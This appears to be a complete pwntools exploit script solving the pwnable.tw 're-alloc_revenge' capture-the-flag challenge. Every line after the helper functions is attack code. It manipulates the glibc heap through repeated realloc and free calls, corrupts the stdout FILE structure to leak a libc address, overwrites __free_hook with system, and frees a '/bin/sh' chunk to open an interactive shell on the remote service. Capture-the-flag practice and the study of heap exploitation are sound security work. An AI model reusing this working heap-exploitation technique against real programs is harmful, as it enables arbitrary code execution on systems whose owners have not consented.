from pwn import *

e = ELF("./re-alloc_revenge")
libc = ELF("./libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("chall.pwnable.tw", 10310)
else:
  p = process(e.path, env={"LD_PRELOAD": libc.path}, aslr=False)

def alloc(idx, size, data="AAAA"):
  p.sendline("1")
  p.sendlineafter("Index:", str(idx))
  p.sendlineafter("Size:", str(size))
  p.sendafter("Data:", data)

  p.recvuntil("choice:")

def realloc(idx, size, data="AAAA"):
  p.sendline("2")
  p.sendlineafter("Index:", str(idx))
  p.sendlineafter("Size:", str(size))
  
  if size != 0:
    p.sendafter("Data:", data)

  p.recvuntil("choice:")

def free(idx):
  p.sendline("3")
  p.sendlineafter("Index:", str(idx))

  p.recvuntil("choice:")

p.recvuntil("choice:")


alloc(0, 0x60)
alloc(1, 0x50)
free(1)
free(0)

alloc(0, 0x70)
for i in range(9):
  realloc(0, 0x30)
  realloc(0, 0x70)

realloc(0, 0x70, "A" * 8 * 2 + p64(0x480) + p64(0x21) + p64(0) * 3 + p64(0x11))

free(0)

alloc(0, 0x68, "A" * 0x48 + p64(0x80))
realloc(0, 0)
realloc(0, 0x68)

realloc(0, 0x10)
realloc(0, 0)
realloc(0, 0x10, p64(0) * 2)
realloc(0, 0)
realloc(0, 0x10, "\xb0")

alloc(1, 0x68)
# Why doesn't this break?? Shouldn't it double free
free(0)

alloc(0, 0x68, p64(0) * 3 + p64(0x481 + 0x80))
free(0)
realloc(1, 0x10, p64(0) * 2)
free(1)


# Unsorted bin
alloc(0, 0x50)
free(0)

alloc(0, 0x50)
alloc(1, 0x50)
free(0)
realloc(1, 0)
realloc(1, 0x50, p64(0) + p64(0))
realloc(1, 0)
realloc(1, 0x50, "\x90")

alloc(0, 0x50, p64(0))

realloc(0, 0x20)
free(0)

realloc(1, 0x20, p64(0) * 2)
free(1)

alloc(1, 0x60, "\x00")
realloc(1, 0x60, "\x60\xc7")

alloc(0, 0x50)
realloc(0, 0x20)
free(0)


p.sendline("1")
p.sendlineafter("Index:", str(0))
p.sendlineafter("Size:", str(0x50))
p.sendafter("Data:", p64(0xfbad1800) + p64(0) * 3)

p.recv(8)

leak = u64(p.recv(8)) - 0x15555551e570 + 0x0000155555337000

print(hex(leak))
p.recvuntil("choice:")


realloc(1, 0x30, p64(0) * 2)
free(1)

for i in range(3):
  alloc(1, 0x70)
  realloc(1, 0x30)
  free(1)

alloc(1, 0x78, "\x00" * 0x68 + p64(0x41) + p64(leak + libc.symbols["__free_hook"] - 8))
realloc(1, 0x10)
realloc(1, 0)
realloc(1, 0x10, p64(0) * 2)
free(1)

alloc(1, 0x30)
realloc(1, 0x10)
free(1)

alloc(1, 0x30, "/bin/sh\x00" + p64(leak + libc.symbols["system"]))

p.sendline("3")
p.sendlineafter("Index:", str(1))


p.interactive()
